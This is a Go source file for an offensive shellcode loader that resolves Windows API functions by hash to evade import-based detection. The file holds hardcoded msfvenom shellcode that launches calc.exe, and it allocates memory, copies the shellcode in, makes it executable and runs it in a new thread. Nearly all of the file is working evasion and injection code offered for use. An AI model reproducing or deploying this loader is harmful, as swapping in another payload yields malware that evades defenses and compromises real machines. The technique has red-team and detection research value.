/*
Author: Zane Gittins
Based on C code from the below references -
References: https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
*/

package main

import (
	"debug/pe"
	"encoding/hex"
	"fmt"
	"go-inject/inject"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	VirtualAllocHash        = 0x97bc257
	RtlCopyMemoryHash       = 0xd232bb4b
	VirtualProtectHash      = 0xe857500d
	CreateThreadHash        = 0x98baab11
	WaitForSingleObjectHash = 0xdf1b3da
	syscallSuccess          = "The operation completed successfully."
)

type ImageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type ImageNTHeaders struct {
	Signature      uint32
	FileHeader     ImageFileHeader
	OptionalHeader pe.OptionalHeader64 // 64 bit.
}

type ImageDosHeader struct {
	EMagic    uint16
	ECblp     uint16
	ECp       uint16
	ECrlc     uint16
	ECparhdr  uint16
	EMinalloc uint16
	EMaxalloc uint16
	ESs       uint16
	ESp       uint16
	ECsum     uint16
	EIp       uint16
	ECs       uint16
	ELfarlc   uint16
	EOvno     uint16
	ERes      [4]uint16
	EOemid    uint16
	EOeminfo  uint16
	ERes2     [10]uint16
	ELfanew   uint32
}

type ImageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

func getHashFromString(function string) int {

	hash := 0x1505

	// function = strings.ToUpper(function)

	for i := 0; i < len(function); i++ {
		hash = (hash * 0x21) & 0xFFFFFFFF
		hash = (hash + (int(function[i]) & 0xFFFFFFDF)) & 0xFFFFFFFF
	}

	return hash
}

func getFunctionAddressbyHash(library string, hash int) uintptr {

	// Get library base.
	libraryBase, err := inject.LoadLibraryA(library)
	if err.Error() != syscallSuccess {
		fmt.Printf("%s\n", err)
	}

	// 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	dosHeader := (*ImageDosHeader)(unsafe.Pointer(&(*[64]byte)(unsafe.Pointer(libraryBase))[:][0]))
	// fmt.Printf("DOS Header EMagic: %x\n", dosHeader.EMagic) // 5a4d

	// PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	offset := (libraryBase) + uintptr(dosHeader.ELfanew)
	imageNTHeaders := (*ImageNTHeaders)(unsafe.Pointer(&(*[264]byte)(unsafe.Pointer(offset))[:][0]))
	// fmt.Printf("NT Header Signature: %x\n", imageNTHeaders.Signature) // 4450

	// DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	exportDirectoryRVA := imageNTHeaders.OptionalHeader.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	// fmt.Printf("Export Directory RVA: %x\n", exportDirectoryRVA) // 99070

	// 	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	offset = (libraryBase) + uintptr(exportDirectoryRVA)
	imageExportDirectory := (*ImageExportDirectory)(unsafe.Pointer(&(*[256]byte)(unsafe.Pointer(offset))[:][0]))
	// fmt.Printf("Export Directory Name: %x\n", imageExportDirectory.Name)                                 // 9d062
	// fmt.Printf("imageExportDirectory.AddressOfFunctions: %x\n", imageExportDirectory.AddressOfFunctions) // 9d062

	// PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	offset = (libraryBase) + uintptr(imageExportDirectory.AddressOfFunctions)
	addresOfFunctionsRVA := (*uint)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))
	// fmt.Printf("addresOfFunctionsRVA: %x\n", *&addresOfFunctionsRVA) // 17a99098 - 7ff917a99098

	// 	DWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	offset = (libraryBase) + uintptr(imageExportDirectory.AddressOfNames)
	addressOfNamesRVA := (*uint32)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))
	// fmt.Printf("addressOfNamesRVA: %x\n", addressOfNamesRVA)

	// addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
	// offset = (libraryBase) + uintptr(imageExportDirectory.AddressOfNameOrdinals)
	// addressOfNameOrdinalsRVA := (*uint32)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))
	// fmt.Printf("addressOfNameOrdinalsRVA: %x\n", addressOfNameOrdinalsRVA)
	// fmt.Printf("NumberOfFunctions %d\n", imageExportDirectory.NumberOfFunctions)

	// for (i i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	for i := (0); i < int(imageExportDirectory.NumberOfFunctions); i += 1 {

		// DWORD functionNameRVA = addressOfNamesRVA[i];
		offset = (libraryBase) + uintptr(imageExportDirectory.AddressOfNames) + uintptr(i*4)
		addressOfNamesRVA = (*uint32)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))
		functionNameRVA := (*uint32)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(addressOfNamesRVA))[:][0])) // 9d06f

		// DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		offset = (libraryBase) + uintptr(*functionNameRVA)
		functionNameVA := (uintptr)(unsafe.Pointer(&(*[32]byte)(unsafe.Pointer(offset))[:][0])) // 9d06f

		// Read until null byte, strings should be null terminated.
		functionName := ""
		for k := 0; k < 1000; k++ { // This for loop should be improved to not have an arbitrary high number.
			nextChar := (*byte)(unsafe.Pointer(&(*[64]byte)(unsafe.Pointer(functionNameVA))[:][k]))
			if *nextChar == 0x00 {
				break
			}
			functionName += string(*nextChar)
		}
		functionNameHash := getHashFromString(functionName)

		if functionNameHash == hash {

			// addressOfNameOrdinalsRVA[i]
			offset = (libraryBase) + uintptr(imageExportDirectory.AddressOfNameOrdinals) + uintptr(i*2) // We multiply by 2 because each element is 2 bytes in the array.
			ordinalRVA := (*uint16)(unsafe.Pointer(&(*[2]byte)(unsafe.Pointer(offset))[:][0]))
			//fmt.Printf("addressOfNameOrdinalsRVA: %x\n", *ordinalRVA) // 0xf5

			// functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			offset = uintptr(unsafe.Pointer(*&addresOfFunctionsRVA)) + uintptr(uint32(*ordinalRVA)*4) // We multiply by 4 because each element is 4 bytes in the array.
			functionAddressRVA := (*uint32)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))
			//fmt.Printf("functionAddressRVA: %x\n", *functionAddressRVA) // 0x1b5a0

			//functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			offset = (libraryBase) + uintptr(*functionAddressRVA) // 0x1b5a0
			functionAddress := (uintptr)(unsafe.Pointer(&(*[4]byte)(unsafe.Pointer(offset))[:][0]))

			// fmt.Printf("%s : 0x%x : %x\n", functionName, functionNameHash, functionAddress) // CreateThread : 0x544e304 : 7ff917a9e9d6
			// CreateThread : 0x544e304 : 17a1b5a0
			return functionAddress
		}
	}

	return 0x00

}

func main() {

	// msfvenom -p windows/x64/exec CMD=calc.exe -f hex
	var payload string = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}

	// Get VirtualAlloc by hash, and call
	customVirtualAlloc := getFunctionAddressbyHash("kernel32", VirtualAllocHash)
	var address uintptr
	if customVirtualAlloc != 0x00 {

		address, _, err = syscall.Syscall6(customVirtualAlloc, 4, uintptr(0), uintptr(len(sc)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE, 0, 0)
		if err.Error() != syscallSuccess {
			fmt.Printf("%s\n", err)
		}
	}

	// Get RtlCopyMemory by hash, and call
	customRtlCopyMemory := getFunctionAddressbyHash("ntdll", RtlCopyMemoryHash)
	if customRtlCopyMemory != 0x00 {

		_, _, err := syscall.Syscall(customRtlCopyMemory, 3, address, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
		if err.Error() != syscallSuccess {
			fmt.Printf("%s\n", err)
		}
	}

	// Get VirtualProtect by hash, and call
	customVirtualProtect := getFunctionAddressbyHash("kernel32", VirtualProtectHash)
	if customVirtualProtect != 0x00 {
		var oldProtect uint32
		_, _, err := syscall.Syscall6(customVirtualProtect, 4, address, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&oldProtect)), 0, 0)
		if err.Error() != syscallSuccess {
			fmt.Printf("%s\n", err)
		}
	}

	// Get CreateThread by hash, and call
	customCreateThread := getFunctionAddressbyHash("kernel32", CreateThreadHash)
	var thread uintptr
	if customCreateThread != 0x00 {

		thread, _, err = syscall.Syscall6(customCreateThread, 6, 0, 0, address, uintptr(0), 0, 0)
		if err.Error() != syscallSuccess {
			fmt.Printf("%s\n", err)
		}
	}

	// Get WaitForSingleObject by hash, and call
	customWaitForSingleObject := getFunctionAddressbyHash("kernel32", WaitForSingleObjectHash)
	if customWaitForSingleObject != 0x00 {
		_, _, err := syscall.Syscall(customWaitForSingleObject, 2, thread, 0xFFFFFFFF, 0)
		if err.Error() != syscallSuccess {
			fmt.Printf("%s\n", err)
		}
	}

}
